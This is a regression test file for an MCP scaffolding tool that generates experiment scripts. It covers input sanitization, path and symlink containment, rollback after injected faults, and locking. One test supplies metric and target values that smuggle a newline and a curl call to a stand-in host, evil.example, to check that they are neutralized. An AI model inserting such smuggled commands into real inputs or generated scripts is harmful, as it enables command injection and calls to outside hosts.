/**
 * Regression tests for scaffold generation templates and hardening.
 */

import { beforeEach, describe, expect, it } from "bun:test";
import {
	access,
	chmod,
	mkdir,
	mkdtemp,
	readFile,
	readdir,
	rename,
	rm,
	stat,
	symlink,
	writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { getExperiment, listExperiments } from "../../src/db/experiments.js";
import { loadCatalog } from "../../src/db/load-catalog.js";
import { resetDb } from "../../src/db/schema.js";
import { upsertCatalogItem } from "../../src/db/techniques.js";
import {
	type ScaffoldFaultPoint,
	registerScaffoldingTools,
	resolveTemplatePath,
	setScaffoldFaultInjectorForTests,
} from "../../src/tools/scaffolding.js";
import type { CatalogItem } from "../../src/types.js";

interface ScaffoldArgs {
	recipe_id: string;
	project_path: string;
	metric_name: string;
	metric_direction?: "minimize" | "maximize";
	target_file?: string;
	custom_instructions?: string;
	overwrite: boolean;
	budget?: {
		max_iterations?: number;
		max_time_seconds?: number;
		max_tokens?: number;
		max_dollars?: number;
	};
	risk_policy?: {
		sandbox_only?: boolean;
		requires_approval?: boolean;
		network_denied?: boolean;
		secrets_denied?: boolean;
	};
	constraints?: {
		metric_floors?: Record<string, number>;
		metric_ceilings?: Record<string, number>;
	};
}

interface ToolResult {
	content: Array<{ type: "text"; text: string }>;
	isError?: boolean;
}

type ScaffoldHandler = (args: ScaffoldArgs) => Promise<ToolResult>;
type GetTemplateHandler = (args: {
	recipe_id: string;
	template_name: string;
}) => Promise<ToolResult>;

const tempDirs: string[] = [];

beforeEach(async () => {
	setScaffoldFaultInjectorForTests();
	await Promise.all(
		tempDirs.map((dir) => rm(dir, { force: true, recursive: true })),
	);
	tempDirs.length = 0;
	resetDb(":memory:");
	const loadResult = await loadCatalog();
	expect(loadResult.errors).toEqual([]);
});

async function scaffoldResidue(projectDir: string): Promise<string[]> {
	return (await readdir(projectDir)).filter(
		(name) =>
			name === ".autoresearch-scaffold.lock" ||
			name.startsWith(".autoresearch-scaffold-"),
	);
}

async function tempProjectDir(): Promise<string> {
	const dir = await mkdtemp(join(tmpdir(), "autoresearch-scaffold-tool-"));
	tempDirs.push(dir);
	return dir;
}

function scaffoldHandler(): ScaffoldHandler {
	const handlers = new Map<string, ScaffoldHandler>();
	const mcp = {
		tool: (...args: unknown[]) => {
			const [name, , , handler] = args;
			handlers.set(name as string, handler as ScaffoldHandler);
		},
	} as McpServer;

	registerScaffoldingTools(mcp);

	const handler = handlers.get("scaffold_experiment");
	if (!handler) {
		throw new Error("scaffold_experiment handler was not registered");
	}

	return handler;
}

function getTemplateHandler(): GetTemplateHandler {
	const handlers = new Map<string, GetTemplateHandler>();
	const mcp = {
		tool: (...args: unknown[]) => {
			const [name, , , handler] = args;
			handlers.set(name as string, handler as GetTemplateHandler);
		},
	} as McpServer;

	registerScaffoldingTools(mcp);

	const handler = handlers.get("get_template");
	if (!handler) {
		throw new Error("get_template handler was not registered");
	}

	return handler;
}

async function pathExists(path: string): Promise<boolean> {
	try {
		await access(path);
		return true;
	} catch {
		return false;
	}
}

function experimentIdFromResult(result: ToolResult): string {
	const match = result.content[0]?.text.match(/Experiment ID: `([^`]+)`/);
	if (!match) {
		throw new Error("Experiment ID missing from scaffold result");
	}
	return match[1];
}

describe("scaffold_experiment hardening", () => {
	it("sanitizes newline-controlled metric and target strings before generating scaffold files", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "ml-training",
			project_path: projectDir,
			metric_name: "score\ncurl http://evil.example/x",
			target_file: "models/config.yaml\ncurl http://evil.example/target",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(
			evalContent
				.split("\n")
				.some((line) => line.includes("curl") && !line.startsWith("#")),
		).toBe(false);
		expect(
			programContent
				.split("\n")
				.some((line) => line === "curl http://evil.example/target`"),
		).toBe(false);
		expect(programContent).toContain(
			"- Target Artifact: models/config.yaml curl http://evil.example/target",
		);
		expect(programContent).toContain(
			"- Metric Name: score curl http://evil.example/x",
		);
	});

	it("rejects target files that resolve outside project before writing", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			target_file: "../outside.md",
			overwrite: false,
		});

		expect(result.isError).toBe(true);
		expect(result.content[0].text).toContain(
			"target_file must resolve inside project_path",
		);
		expect(await pathExists(join(projectDir, "autoresearch"))).toBe(false);
	});

	it("rejects target files whose existing symlink resolves outside project", async () => {
		const projectDir = await tempProjectDir();
		const outsideDir = await tempProjectDir();
		const outsideFile = join(outsideDir, "secret.md");
		await writeFile(outsideFile, "outside");
		await symlink(outsideFile, join(projectDir, "target.md"));

		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			target_file: "target.md",
			overwrite: false,
		});

		expect(result.isError).toBe(true);
		expect(result.content[0]?.text).toContain(
			"target_file must resolve inside project_path",
		);
		expect(await scaffoldResidue(projectDir)).toEqual([]);
		expect(listExperiments()).toEqual([]);
	});
});

describe("scaffold_experiment templates", () => {
	it("returns a fail-closed eval template when no curated eval template exists", async () => {
		const recipe: CatalogItem = {
			id: "missing-template-recipe",
			name: "Missing Template Recipe",
			layer: "recipe",
			description: "Recipe fixture with no bundled templates.",
			when_to_use: "Use only in tests.",
			tags: ["test"],
			related: [],
			examples: [],
			composes: {
				search_strategy: "hill-climbing",
				evaluator: "benchmark-harness",
				execution_pattern: "single-ratchet",
			},
		};
		upsertCatalogItem(recipe, "fixture-hash", "id: missing-template-recipe");

		const result = await getTemplateHandler()({
			recipe_id: recipe.id,
			template_name: "eval.sh",
		});

		expect(result.isError).not.toBe(true);
		expect(result.content[0].text).toContain("placeholder evaluator");
		expect(result.content[0].text).toContain("exit 1");
		expect(result.content[0].text).not.toContain("printf '%s\\n' '0'");
	});

	it("runs a generated fail-closed evaluator at the documented project-root command", async () => {
		const recipe: CatalogItem = {
			id: "missing-template-recipe",
			name: "Missing Template Recipe",
			layer: "recipe",
			description: "Recipe fixture with no bundled templates.",
			when_to_use: "Use only in tests.",
			tags: ["test"],
			related: [],
			examples: [],
			composes: {
				search_strategy: "hill-climbing",
				evaluator: "benchmark-harness",
				execution_pattern: "single-ratchet",
			},
		};
		upsertCatalogItem(recipe, "fixture-hash", "id: missing-template-recipe");
		const result = await getTemplateHandler()({
			recipe_id: recipe.id,
			template_name: "eval.sh",
		});

		expect(result.isError).not.toBe(true);
		const projectDir = await tempProjectDir();
		await mkdir(join(projectDir, "autoresearch"));
		const evaluatorPath = join(projectDir, "autoresearch", "eval.sh");
		await writeFile(evaluatorPath, result.content[0].text, { mode: 0o755 });
		const process = Bun.spawn(["autoresearch/eval.sh"], {
			cwd: projectDir,
			stderr: "pipe",
			stdout: "pipe",
		});
		expect(await process.exited).toBe(1);
		expect(await new Response(process.stderr).text()).toContain(
			"placeholder evaluator",
		);
	});

	it("uses curated templates for recipes that ship them", async () => {
		const projectDir = await tempProjectDir();
		const curatedEval = await readFile(
			resolveTemplatePath("prompt-optimization", "eval.sh"),
			"utf8",
		);
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			target_file: "target-prompt.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(evalContent.startsWith(curatedEval.split("\n")[0])).toBe(true);
		expect(programContent).toContain("# Prompt Optimization Program");
		expect(programContent).toContain("## Experiment Metadata");
		expect(programContent).toContain("- Metric Name: accuracy");
		expect(programContent).toContain("- Target Artifact: target-prompt.md");
		expect(programContent).toContain(
			"- Evaluator Command: autoresearch/eval.sh",
		);
		expect(programContent).toContain(
			"register/log exactly one iteration 0 result with `is_baseline=true`",
		);
		expect(programContent).toContain(
			"strictly greater than the best earlier score",
		);
		expect(programContent).not.toContain("Higher is better");
	});

	it.each([
		["test-amplification", "# Test Amplification Program"],
		["ml-training", "# ML Training Program"],
		["literature-synthesis", "# Literature Synthesis Program"],
	])("uses curated templates for %s", async (recipeId, heading) => {
		const projectDir = await tempProjectDir();
		const curatedEval = await readFile(
			resolveTemplatePath(recipeId, "eval.sh"),
			"utf8",
		);
		const result = await scaffoldHandler()({
			recipe_id: recipeId,
			project_path: projectDir,
			metric_name: "score",
			target_file: "target.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);

		const evalContent = await readFile(
			join(projectDir, "autoresearch", "eval.sh"),
			"utf8",
		);
		const programContent = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);

		expect(evalContent).toBe(curatedEval);
		expect(programContent).toContain(heading);
		expect(programContent).toContain("## Experiment Metadata");
		expect(programContent).toContain("- Metric Name: score");
	});

	it("persists optional budget, risk policy, and constraints", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "test-amplification",
			project_path: projectDir,
			metric_name: "mutation_score",
			target_file: "src/foo.test.ts",
			overwrite: false,
			budget: { max_iterations: 3, max_time_seconds: 300 },
			risk_policy: {
				sandbox_only: true,
				requires_approval: true,
				network_denied: true,
				secrets_denied: true,
			},
			constraints: {
				metric_floors: { mutation_score: 0.75 },
			},
		});

		expect(result.isError).not.toBe(true);

		const experiment = getExperiment(experimentIdFromResult(result));
		expect(experiment?.spec.budget.max_iterations).toBe(3);
		expect(experiment?.spec.budget.max_time_seconds).toBe(300);
		expect(experiment?.spec.risk_policy.sandbox_only).toBe(true);
		expect(experiment?.spec.risk_policy.requires_approval).toBe(true);
		expect(experiment?.spec.constraints.metric_floors.mutation_score).toBe(
			0.75,
		);
		expect(experiment?.spec.constraints.metric_ceilings).toEqual({});
	});

	it("persists and generates an explicit minimize metric direction", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "loss",
			metric_direction: "minimize",
			target_file: "target-prompt.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);
		expect(
			getExperiment(experimentIdFromResult(result))?.spec.metric_direction,
		).toBe("minimize");
		const program = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);
		expect(program).toContain("- Metric Direction: minimize");
		expect(program).toContain("strictly less than the best earlier score");
	});

	it("defaults omitted metric direction to maximize in persistence and output", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			target_file: "target-prompt.md",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);
		expect(
			getExperiment(experimentIdFromResult(result))?.spec.metric_direction,
		).toBe("maximize");
		const program = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);
		expect(program).toContain("- Metric Direction: maximize");
	});

	it("renders exactly one normalized Run Controls section in curated output", async () => {
		const projectDir = await tempProjectDir();
		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			target_file: "target-prompt.md",
			custom_instructions: "Use the fixed synthetic fixture only.",
			overwrite: false,
			budget: {
				max_iterations: 4,
				max_time_seconds: 120,
				max_tokens: 5000,
				max_dollars: 1.25,
			},
			risk_policy: {
				sandbox_only: true,
				requires_approval: true,
				network_denied: true,
				secrets_denied: true,
			},
			constraints: {
				metric_floors: { accuracy: 0.8 },
				metric_ceilings: { accuracy: 1 },
			},
		});
		expect(result.isError).not.toBe(true);

		const program = await readFile(
			join(projectDir, "autoresearch", "program.md"),
			"utf8",
		);
		expect((program.match(/^## Run Controls$/gm) ?? []).length).toBe(1);
		expect(program).toContain("Use the fixed synthetic fixture only.");
		expect(program).toMatch(/max_iterations[^\n]*4/);
		expect(program).toMatch(/max_time_seconds[^\n]*120/);
		expect(program).toMatch(/max_tokens[^\n]*5000/);
		expect(program).toMatch(/max_dollars[^\n]*1\.25/);
		expect(program).toMatch(/sandbox_only[^\n]*true/);
		expect(program).toMatch(/requires_approval[^\n]*true/);
		expect(program).toMatch(/network_denied[^\n]*true/);
		expect(program).toMatch(/secrets_denied[^\n]*true/);
		expect(program).toMatch(/metric_floors[^\n]*accuracy[^\n]*0\.8/);
		expect(program).toMatch(/metric_ceilings[^\n]*accuracy[^\n]*1/);
		expect(program).toMatch(/Stopping Conditions[^\n]*budget-exhaustion/i);
		expect(program).toMatch(/Metric Direction[^\n]*maximize/i);
		expect(program).toMatch(/Evaluator Command[^\n]*autoresearch\/eval\.sh/i);
	});

	it("restores exact overwrite contents and modes after a filesystem-shaped failure", async () => {
		const projectDir = await tempProjectDir();
		const scaffoldDir = join(projectDir, "autoresearch");
		await mkdir(scaffoldDir);
		const programPath = join(scaffoldDir, "program.md");
		const evalPath = join(scaffoldDir, "eval.sh");
		const resultsPath = join(scaffoldDir, "results.tsv");
		await writeFile(programPath, "original program\n");
		await writeFile(evalPath, "original evaluator\n");
		await chmod(programPath, 0o640);
		await chmod(evalPath, 0o700);
		await mkdir(resultsPath);

		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			overwrite: true,
		});

		expect(result.isError).toBe(true);
		expect(await readFile(programPath, "utf8")).toBe("original program\n");
		expect(await readFile(evalPath, "utf8")).toBe("original evaluator\n");
		expect((await stat(programPath)).mode & 0o777).toBe(0o640);
		expect((await stat(evalPath)).mode & 0o777).toBe(0o700);
		expect((await stat(resultsPath)).isDirectory()).toBe(true);
		expect(listExperiments()).toEqual([]);
	});

	it("canonicalizes a symlinked project root before writing and registration", async () => {
		const realProject = await tempProjectDir();
		const parent = await tempProjectDir();
		const linkedProject = join(parent, "project-link");
		await symlink(realProject, linkedProject, "dir");

		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: linkedProject,
			metric_name: "accuracy",
			overwrite: false,
		});

		expect(result.isError).not.toBe(true);
		expect(result.content[0].text).toContain(
			`Project Path: \`${realProject}\``,
		);
		expect(getExperiment(experimentIdFromResult(result))?.project_path).toBe(
			realProject,
		);
	});

	it.each([
		"stage-mkdir",
		"backup-mkdir",
		"stage-write",
		"stage-chmod",
		"backup-rename",
		"install-rename",
		"db-register",
	] satisfies ScaffoldFaultPoint[])(
		"rolls back exact prior files and leaves no residue after %s failure",
		async (faultPoint) => {
			const projectDir = await tempProjectDir();
			const scaffoldDir = join(projectDir, "autoresearch");
			await mkdir(scaffoldDir);
			const files = ["program.md", "eval.sh", "results.tsv"];
			const modes = [0o640, 0o710, 0o600];
			for (let index = 0; index < files.length; index++) {
				const path = join(scaffoldDir, files[index] as string);
				await writeFile(path, `original-${files[index]}\n`);
				await chmod(path, modes[index] as number);
			}
			let injected = false;
			setScaffoldFaultInjectorForTests((point) => {
				if (!injected && point === faultPoint) {
					injected = true;
					throw new Error(`injected ${point}`);
				}
			});

			const result = await scaffoldHandler()({
				recipe_id: "prompt-optimization",
				project_path: projectDir,
				metric_name: "score",
				overwrite: true,
			});

			expect(injected).toBe(true);
			expect(result.isError).toBe(true);
			for (let index = 0; index < files.length; index++) {
				const path = join(scaffoldDir, files[index] as string);
				expect(await readFile(path, "utf8")).toBe(`original-${files[index]}\n`);
				expect((await stat(path)).mode & 0o777).toBe(modes[index]);
			}
			expect(listExperiments()).toEqual([]);
			expect(await scaffoldResidue(projectDir)).toEqual([]);
		},
	);

	it("recovers from lock creation failure without files, data, or stale exclusion", async () => {
		const projectDir = await tempProjectDir();
		let injected = false;
		setScaffoldFaultInjectorForTests((point) => {
			if (!injected && point === "lock-mkdir") {
				injected = true;
				throw new Error("injected lock-mkdir");
			}
		});

		const failed = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});

		expect(failed.isError).toBe(true);
		expect(listExperiments()).toEqual([]);
		expect(await pathExists(join(projectDir, "autoresearch"))).toBe(false);
		expect(await scaffoldResidue(projectDir)).toEqual([]);

		setScaffoldFaultInjectorForTests();
		const recovered = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});
		expect(recovered.isError).not.toBe(true);
		expect(listExperiments()).toHaveLength(1);
		expect(await scaffoldResidue(projectDir)).toEqual([]);
	});

	it("reports committed success and quarantines the lock after bounded removal failures", async () => {
		const projectDir = await tempProjectDir();
		let removalAttempts = 0;
		setScaffoldFaultInjectorForTests((point) => {
			if (point === "lock-remove") {
				removalAttempts++;
				throw new Error("injected lock-remove");
			}
		});

		const committed = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});

		expect(committed.isError).not.toBe(true);
		expect(removalAttempts).toBe(3);
		expect(listExperiments()).toHaveLength(1);
		for (const file of ["program.md", "eval.sh", "results.tsv"]) {
			expect(await pathExists(join(projectDir, "autoresearch", file))).toBe(
				true,
			);
		}
		const recoveryArtifacts = await scaffoldResidue(projectDir);
		expect(recoveryArtifacts).toHaveLength(1);
		expect(recoveryArtifacts[0]).toStartWith(
			".autoresearch-scaffold-lock-recovery-",
		);

		setScaffoldFaultInjectorForTests();
		const future = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score-2",
			overwrite: true,
		});
		expect(future.isError).not.toBe(true);
		expect(listExperiments()).toHaveLength(2);
		expect(await scaffoldResidue(projectDir)).toEqual(recoveryArtifacts);
	});

	it("restores prior data and preserves recovery evidence when installed-file removal fails", async () => {
		const projectDir = await tempProjectDir();
		const scaffoldDir = join(projectDir, "autoresearch");
		await mkdir(scaffoldDir);
		const files = ["program.md", "eval.sh", "results.tsv"];
		for (const file of files) {
			await writeFile(join(scaffoldDir, file), `original-${file}\n`);
		}
		setScaffoldFaultInjectorForTests((point) => {
			if (point === "db-register") throw new Error("injected registration");
			if (point === "rollback-remove-installed") {
				throw new Error("injected installed removal");
			}
		});

		const failed = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: true,
		});

		expect(failed.isError).toBe(true);
		expect(failed.content[0]?.text).toContain("rollback failed");
		expect(listExperiments()).toEqual([]);
		for (const file of files) {
			expect(await readFile(join(scaffoldDir, file), "utf8")).toBe(
				`original-${file}\n`,
			);
		}
		const residue = await scaffoldResidue(projectDir);
		expect(residue).toHaveLength(1);
		expect(residue[0]).toStartWith(".autoresearch-scaffold-");
		expect(residue[0]).not.toContain("lock");
	});

	it("leaves only recoverable empty artifacts when new-directory rollback removal fails", async () => {
		const projectDir = await tempProjectDir();
		setScaffoldFaultInjectorForTests((point) => {
			if (point === "db-register") throw new Error("injected registration");
			if (point === "rollback-remove-directory") {
				throw new Error("injected directory removal");
			}
		});

		const failed = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});

		expect(failed.isError).toBe(true);
		expect(listExperiments()).toEqual([]);
		expect(await readdir(join(projectDir, "autoresearch"))).toEqual([]);
		const residue = await scaffoldResidue(projectDir);
		expect(residue).toHaveLength(1);
		expect(residue[0]).not.toContain("lock");

		setScaffoldFaultInjectorForTests();
		const recovered = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});
		expect(recovered.isError).not.toBe(true);
		expect(listExperiments()).toHaveLength(1);
		expect(await scaffoldResidue(projectDir)).toEqual(residue);
	});

	it("preserves transaction backups and reports their exact path when restore fails", async () => {
		const projectDir = await tempProjectDir();
		const scaffoldDir = join(projectDir, "autoresearch");
		await mkdir(scaffoldDir);
		for (const file of ["program.md", "eval.sh", "results.tsv"]) {
			await writeFile(join(scaffoldDir, file), `original-${file}\n`);
		}
		setScaffoldFaultInjectorForTests((point) => {
			if (point === "db-register") throw new Error("injected registration");
			if (point === "rollback-restore-backup") {
				throw new Error("injected restore failure");
			}
		});

		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: true,
		});

		expect(result.isError).toBe(true);
		const message = result.content[0]?.text ?? "";
		const match = message.match(/recovery backups preserved at: ([^;\n]+)/);
		expect(match).not.toBeNull();
		const recoveryPath = match?.[1] as string;
		expect(recoveryPath.startsWith(projectDir)).toBe(true);
		expect((await readdir(recoveryPath)).sort()).toEqual([
			"eval.sh",
			"program.md",
			"results.tsv",
		]);
		expect(listExperiments()).toEqual([]);
		expect((await scaffoldResidue(projectDir)).length).toBe(1);
	});

	it.each([
		"scaffold-mkdir",
		"cleanup-transaction",
	] satisfies ScaffoldFaultPoint[])(
		"handles a one-shot %s failure without lock or staging residue",
		async (faultPoint) => {
			const projectDir = await tempProjectDir();
			let injected = false;
			setScaffoldFaultInjectorForTests((point) => {
				if (!injected && point === faultPoint) {
					injected = true;
					throw new Error(`injected ${point}`);
				}
			});

			const result = await scaffoldHandler()({
				recipe_id: "prompt-optimization",
				project_path: projectDir,
				metric_name: "score",
				overwrite: false,
			});

			expect(injected).toBe(true);
			if (faultPoint === "cleanup-transaction") {
				expect(result.isError).not.toBe(true);
				expect(listExperiments()).toHaveLength(1);
			} else {
				expect(result.isError).toBe(true);
				expect(listExperiments()).toEqual([]);
			}
			expect(await scaffoldResidue(projectDir)).toEqual([]);
		},
	);

	it("reports committed success with recovery evidence after persistent transaction cleanup failure", async () => {
		const projectDir = await tempProjectDir();
		let cleanupAttempts = 0;
		setScaffoldFaultInjectorForTests((point) => {
			if (point === "cleanup-transaction") {
				cleanupAttempts++;
				throw new Error("injected persistent cleanup failure");
			}
		});

		const committed = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy",
			target_file: "target-prompt.md",
			overwrite: false,
		});

		expect(committed.isError).not.toBe(true);
		expect(cleanupAttempts).toBe(2);
		expect(committed.content[0]?.text).toContain(
			"transaction cleanup failed after commit",
		);
		expect(committed.content[0]?.text).toContain("Do not retry");
		expect(listExperiments()).toHaveLength(1);
		const message = committed.content[0]?.text ?? "";
		const recoveryMatch = message.match(/Recovery Path: `([^`]+)`/);
		expect(recoveryMatch).not.toBeNull();
		const recoveryPath = recoveryMatch?.[1] as string;
		expect(recoveryPath.startsWith(projectDir)).toBe(true);
		expect(await pathExists(recoveryPath)).toBe(true);

		const scaffoldDir = join(projectDir, "autoresearch");
		expect(await readFile(join(scaffoldDir, "program.md"), "utf8")).toContain(
			"- Metric Name: accuracy",
		);
		expect(await readFile(join(scaffoldDir, "eval.sh"), "utf8")).toBe(
			await readFile(
				resolveTemplatePath("prompt-optimization", "eval.sh"),
				"utf8",
			),
		);
		expect(await readFile(join(scaffoldDir, "results.tsv"), "utf8")).toBe(
			"iteration\tscore\timproved\tis_baseline\tchange_description\tduration_seconds\tcost_tokens\tcost_dollars\n",
		);

		setScaffoldFaultInjectorForTests();
		const subsequent = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "accuracy-2",
			target_file: "target-prompt.md",
			overwrite: true,
		});
		expect(subsequent.isError).not.toBe(true);
		expect(listExperiments()).toHaveLength(2);
		expect(await pathExists(recoveryPath)).toBe(true);
		expect(await readFile(join(scaffoldDir, "program.md"), "utf8")).toContain(
			"- Metric Name: accuracy-2",
		);
	});

	it("rejects an injected scaffold directory identity swap before install", async () => {
		const projectDir = await tempProjectDir();
		const outsideDir = await tempProjectDir();
		const scaffoldDir = join(projectDir, "autoresearch");
		const movedDir = join(projectDir, "autoresearch-moved");
		let swapped = false;
		setScaffoldFaultInjectorForTests(async (point) => {
			if (!swapped && point === "install-rename") {
				swapped = true;
				await rename(scaffoldDir, movedDir);
				await symlink(outsideDir, scaffoldDir, "dir");
			}
		});

		const result = await scaffoldHandler()({
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		});

		expect(swapped).toBe(true);
		expect(result.isError).toBe(true);
		expect(result.content[0]?.text).toContain("identity changed");
		expect(await readdir(outsideDir)).toEqual([]);
		expect(listExperiments()).toEqual([]);
	});

	it("serializes concurrent scaffolds for the same canonical project", async () => {
		const projectDir = await tempProjectDir();
		let releaseFirst: (() => void) | undefined;
		const blocked = new Promise<void>((resolve) => {
			releaseFirst = resolve;
		});
		let reachedFirst: (() => void) | undefined;
		const reached = new Promise<void>((resolve) => {
			reachedFirst = resolve;
		});
		let held = false;
		setScaffoldFaultInjectorForTests(async (point) => {
			if (!held && point === "stage-write") {
				held = true;
				reachedFirst?.();
				await blocked;
			}
		});
		const handler = scaffoldHandler();
		const args: ScaffoldArgs = {
			recipe_id: "prompt-optimization",
			project_path: projectDir,
			metric_name: "score",
			overwrite: false,
		};
		const first = handler(args);
		await reached;
		const second = await handler(args);
		expect(second.isError).toBe(true);
		expect(second.content[0]?.text).toContain("already in progress");
		releaseFirst?.();
		expect((await first).isError).not.toBe(true);
		expect(listExperiments()).toHaveLength(1);
		expect(await scaffoldResidue(projectDir)).toEqual([]);
	});
});
